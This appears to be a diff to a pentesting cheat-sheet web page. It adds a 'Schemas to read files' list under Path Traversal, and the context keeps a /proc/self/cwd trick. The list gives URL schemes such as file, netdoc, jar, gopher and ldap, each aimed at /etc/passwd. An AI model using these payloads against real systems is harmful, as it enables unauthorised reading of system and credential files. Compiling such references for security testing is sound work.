@@ -125,6 +125,8 @@
     
     <ul>
     
+        <li><a class="" href="#schemas-to-read-files">Schemas to read files</a></li>
+    
         <li><a class="" href="#fake-current-working-directory">Fake current working directory</a></li>
     
         <li><a class="" href="#path-traversal-on-http-path">Path Traversal on HTTP path</a></li>
@@ -166,6 +168,14 @@
                 <li class="">
                     
     <a class="section-link" href="../postgresql/">PostgreSQL</a>
+                </li>
+                <li class="">
+                    
+    <a class="section-link" href="../mariadb/">MariaDB</a>
+                </li>
+                <li class="">
+                    
+    <a class="section-link" href="../oracle/">Oracle</a>
                 </li>
     </ul>
           </li>
@@ -334,6 +344,14 @@
             
               <h1></h1>
               <h1 id="path-traversal">Path Traversal</h1>
+<h2 id="schemas-to-read-files">Schemas to read files</h2>
+<pre><code class="language-none">file:///etc/passwd
+netdoc:///etc/passwd (Java)
+jar:///etc/passwd
+dict:///etc/passwd
+gopher:///etc/passwd
+ldap:///etc/passwd
+</code></pre>
 <h2 id="fake-current-working-directory">Fake current working directory</h2>
 <p>This is a symbolic link to the current working directory of the process:</p>
 <pre><code class="language-none">file:///proc/self/cwd/
